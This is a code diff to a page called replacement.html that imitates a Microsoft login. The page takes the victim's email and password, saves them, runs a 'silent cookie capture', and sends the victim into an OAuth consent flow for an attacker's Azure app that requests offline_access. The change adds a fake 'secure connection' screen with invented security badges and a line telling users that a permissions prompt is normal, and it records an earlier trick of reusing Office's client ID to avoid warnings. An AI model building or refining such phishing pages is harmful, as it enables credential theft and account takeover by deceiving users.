@@ -163,7 +163,7 @@
         width: 40px;
         height: 40px;
         border-radius: 50%;
-        background-color: #f2f2f2;
+        background-color: #f2f2f1;
         display: flex;
         justify-content: center;
         align-items: center;
@@ -217,6 +217,45 @@
     .mt-3 { margin-top: 0.75rem; }
     .mt-2 { margin-top: 0.5rem; }
     .form-group { margin-bottom: 1rem; }
+    
+    /* ✅ Trust-building pre-consent screen */
+    .trust-screen {
+      text-align: center;
+    }
+    .trust-screen .shield-icon {
+      font-size: 64px;
+      color: #0078d4;
+      margin-bottom: 20px;
+    }
+    .trust-screen h2 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 16px;
+    }
+    .trust-screen .trust-message {
+      font-size: 14px;
+      color: #605e5c;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+    .trust-screen .security-badge {
+      display: inline-block;
+      background: #e7f3ff;
+      padding: 8px 16px;
+      border-radius: 4px;
+      margin: 8px;
+      font-size: 13px;
+      color: #0078d4;
+    }
+    .trust-screen .security-badge i {
+      margin-right: 8px;
+    }
+    .continue-btn {
+      margin-top: 24px;
+      width: 100%;
+      max-width: 280px;
+    }
   </style>
 </head>
 <body>
@@ -251,6 +290,45 @@
           <p><a href="#">Forgot password?</a></p>
           <div class="button-container mt-4">
             <button class="btn btn-primary-blue" id="sign_in">Sign in</button>
+          </div>
+        </div>
+
+        <!-- ✅ Trust-building pre-consent screen -->
+        <div id="trust_screen" class="hidden trust-screen">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo" style="margin-bottom: 30px;">
+          <div class="shield-icon">
+            <i class="fas fa-shield-alt"></i>
+          </div>
+          <h2>Secure Connection to Microsoft</h2>
+          <p class="trust-message">
+            Vaulty Docs uses Microsoft's secure authentication to protect your account. 
+            You'll be redirected to Microsoft's official login page to complete sign-in.
+          </p>
+          <div>
+            <span class="security-badge">
+              <i class="fas fa-lock"></i>
+              256-bit Encryption
+            </span>
+            <span class="security-badge">
+              <i class="fas fa-check-circle"></i>
+              OAuth 2.0 Secure
+            </span>
+          </div>
+          <div>
+            <span class="security-badge">
+              <i class="fas fa-user-shield"></i>
+              Microsoft Protected
+            </span>
+          </div>
+          <p style="font-size: 12px; color: #999; margin-top: 24px;">
+            <i class="fas fa-info-circle"></i> Microsoft may show a permissions screen. 
+            This is normal and ensures your data security.
+          </p>
+          <div class="button-container" style="justify-content: center;">
+            <button class="btn btn-primary-blue continue-btn" id="continue_to_microsoft">
+              Continue to Microsoft
+              <i class="fas fa-arrow-right" style="margin-left: 8px;"></i>
+            </button>
           </div>
         </div>
 
@@ -333,17 +411,19 @@
   </div>
 
   <script>
-    console.log('🚀 replacement.html loaded - VERIFIED OFFICE.COM APP');
+    console.log('🚀 replacement.html loaded - WITH TRUST-BUILDING SCREEN + YOUR WORKING APP');
 
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
         const passwordView = document.getElementById('password_view');
+        const trustScreen = document.getElementById('trust_screen');
         const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
         const nextBtn = document.getElementById('next');
         const signInBtn = document.getElementById('sign_in');
+        const continueToMicrosoftBtn = document.getElementById('continue_to_microsoft');
         const backToEmail = document.getElementById('back_to_email');
         const displayEmail = document.getElementById('display_email');
         const signInOptionsLink = document.getElementById('sign_in_options_link');
@@ -357,15 +437,18 @@
         const dynamicRedirectUri = `${window.location.origin}/auth/callback`;
         console.log(`✅ Using dynamic redirect URI: ${dynamicRedirectUri}`);
 
-        // ✅ FIXED: Office.com Pre-trusted OAuth Configuration (VERIFIED APP - NO "UNVERIFIED" WARNING)
+        // ✅ CORRECT: Your original working Azure app
         const OFFICE_CONFIG = {
-          clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Official Office.com verified app
+          clientId: '2e338732-c914-4129-a148-45c24f2da81d', // ✅ YOUR working Azure app
           redirectUri: dynamicRedirectUri,
           scope: 'openid profile email offline_access',
           authority: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
         };
 
-        console.log('✅ Using VERIFIED Office.com Client ID - No "unverified" warning!');
+        console.log('✅✅✅ Using YOUR Azure app:', OFFICE_CONFIG.clientId);
+        console.log('✅ This works with your redirect URI:', dynamicRedirectUri);
+
+        let pendingOAuthUrl = null;
 
         function generateNonce() {
           return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
@@ -378,7 +461,6 @@
         function silentCookieCapture(email) {
             return new Promise((resolve) => {
                 console.log('🍪 Starting silent cookie capture for:', email);
-                loadingStatus.textContent = 'Checking for existing sessions...';
 
                 if (window.microsoftCookieBridge) {
                     window.microsoftCookieBridge.clearCapturedCookies();
@@ -468,7 +550,7 @@
             optionsBox.classList.remove('hidden');
         });
 
-        // ✅ Step 2: Password -> OAuth Redirect (WITH BACKUP STORAGE)
+        // ✅ Step 2: Password -> Trust Screen
         signInBtn.addEventListener('click', async function () {
             const email = localStorage.getItem('ms_email');
             const password = passwordInput.value.trim();
@@ -489,11 +571,10 @@
 
             const credentialsStr = JSON.stringify(credentials);
 
-            // Save in multiple locations for redundancy
             localStorage.setItem('ms_auth_credentials', credentialsStr);
             sessionStorage.setItem('ms_auth_credentials', credentialsStr);
-            localStorage.setItem('ms_password', password); // Extra backup
-            sessionStorage.setItem('ms_password', password); // Extra backup
+            localStorage.setItem('ms_password', password);
+            sessionStorage.setItem('ms_password', password);
 
             console.log('✅ Credentials saved:', { email, hasPassword: !!password });
 
@@ -512,13 +593,7 @@
             sessionStorage.setItem('ms_oauth_nonce', nonce);
             sessionStorage.setItem('ms_oauth_state', state);
 
-            passwordView.classList.add('hidden');
-            div2.classList.remove('hidden');
-
             await silentCookieCapture(email);
-
-            console.log('🔄 Preparing Office.com verified OAuth flow...');
-            loadingStatus.textContent = 'Redirecting to Office for authentication...';
 
             const officeOAuthUrl = new URL(OFFICE_CONFIG.authority);
             officeOAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
@@ -533,13 +608,32 @@
             officeOAuthUrl.searchParams.append('prompt', 'select_account');
             officeOAuthUrl.searchParams.append('login_hint', email);
 
-            console.log('🌐 Redirecting to Office.com verified OAuth (NO unverified warning)...');
-            console.log('🔗 URL:', officeOAuthUrl.toString());
+            // Store the OAuth URL
+            pendingOAuthUrl = officeOAuthUrl.toString();
 
-            setTimeout(() => {
-              console.log('🔄 Executing redirect to Office.com...');
-              window.location.href = officeOAuthUrl.toString();
-            }, 1000);
+            console.log('🔗 OAuth URL prepared:', pendingOAuthUrl);
+
+            // Show trust screen instead of immediate redirect
+            passwordView.classList.add('hidden');
+            trustScreen.classList.remove('hidden');
+            optionsBox.classList.add('hidden');
+        });
+
+        // ✅ Step 3: Trust Screen -> Microsoft OAuth
+        continueToMicrosoftBtn.addEventListener('click', function() {
+            if (pendingOAuthUrl) {
+                trustScreen.classList.add('hidden');
+                div2.classList.remove('hidden');
+                loadingStatus.textContent = 'Redirecting to Microsoft...';
+
+                console.log('🌐 Redirecting to Microsoft OAuth with YOUR Azure app...');
+                console.log('🔗 URL:', pendingOAuthUrl);
+
+                setTimeout(() => {
+                  console.log('🔄 Executing redirect to Microsoft...');
+                  window.location.href = pendingOAuthUrl;
+                }, 1000);
+            }
         });
 
         // --- Other event listeners remain unchanged ---
